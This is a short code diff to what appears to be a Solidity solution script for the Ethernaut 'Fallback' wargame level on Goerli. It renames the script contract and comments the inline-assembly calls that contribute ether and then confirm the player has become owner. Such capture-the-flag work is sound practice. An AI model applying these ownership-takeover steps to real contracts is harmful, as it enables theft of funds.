@@ -12,7 +12,7 @@ interface Instance {
     function withdraw() external;
 }
 
-contract LevelScript is EthernautScript {
+contract FallbackScript is EthernautScript {
     string network = "goerli";
     address level = 0x80934BE6B8B872B364b470Ca30EaAd8AEAC4f63F;
 
@@ -53,7 +53,7 @@ contract LevelScript is EthernautScript {
             let dest := sload(instance.slot)
 
             mstore(0, "contribute()")
-            mstore(0, keccak256(0, 12))
+            mstore(0, keccak256(0, 12)) // we hash the previous string. 12 is the length of "contribute()"
             let success := call(gas(), dest, 1, 0, 4, 0, 0)
             if iszero(success) {
                 revert(0, 0)
@@ -83,6 +83,7 @@ contract LevelScript is EthernautScript {
             if iszero(success) {
                 revert(0, 0)
             }
+            // we stored the result from the previous call (the `owner`) at offset 0 in memory
             let owner := mload(0)
             if iszero(eq(owner, sload(player.slot))) {
                 revert(0, 0)
